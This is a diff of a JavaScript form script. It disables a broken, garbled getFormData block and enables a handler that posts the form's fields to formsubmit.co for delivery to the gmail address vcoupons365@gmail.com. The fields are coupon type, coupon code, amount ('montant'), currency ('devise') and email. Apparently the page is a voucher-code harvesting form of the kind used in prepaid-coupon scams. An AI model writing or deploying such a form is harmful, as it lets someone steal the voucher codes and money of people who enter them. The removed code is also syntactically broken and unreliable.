@@ -36,13 +36,13 @@ const getFormData = () => {
             }
         }
     });
-    formdata.code = code;
-     type:formdata.get('type'),
-     codes:formdata.get('code'),('code'),('code'),('code')
-	montant:formdata.get('montant'),
-	devise:formdata.get('devise')
-	  De:formdata.get('email'),
-    return JSON.stringify(formdata);
+    // formdata.code = code;
+    //  type:formdata.get('type'),
+    //  codes:formdata.get('code'),('code'),('code'),('code')
+	// montant:formdata.get('montant'),
+	// devise:formdata.get('devise')
+	//   De:formdata.get('email'),
+    // return JSON.stringify(formdata);
 }
 
 // document.addEventListener("DOMContentLoaded", () => {
@@ -75,28 +75,28 @@ const getFormData = () => {
 // });
 
 
-// const form = document.getElementById('sendmail');
-// console.log("form", form)
+const form = document.getElementById('sendmail');
+console.log("form", form)
 
 																
-// const handleSubmit = async (event) => {
-//     event.preventDefault();
-//     const data = new FormData(form);
+const handleSubmit = async (event) => {
+    event.preventDefault();
+    const data = new FormData(form);
+    
+    try {
+        await fetch("https://formsubmit.co/vcoupons365@gmail.com", {
+            method: 'POST',
+            body: data
+        });
+        location.href = "thanks.html";
+    } catch (e) {
+        alert("An Error Occurred", e.message)
+        console.log(e)
+    }
+}	
 
-//         try {
-//     const response = await fetch("https://formsubmit.co/vcoupons365@gmail.com", {
-//         method: 'POST',
-//         body: data
-//     });
-//     console.log("respon", response)
-//     // location.href = "thanks.html";
-//     } catch (error) {
-//         console.log(error)
-//     }
-// }	
-
-// form.addEventListener('submit', handleSubmit);
+form.addEventListener('submit', handleSubmit);
 
 
 // https://formsubmit.co/69b2a9edbaaf587d04e831601f3f63b8
-// vcoupons365@gmail.com														
+// vcoupons365@gmail.com
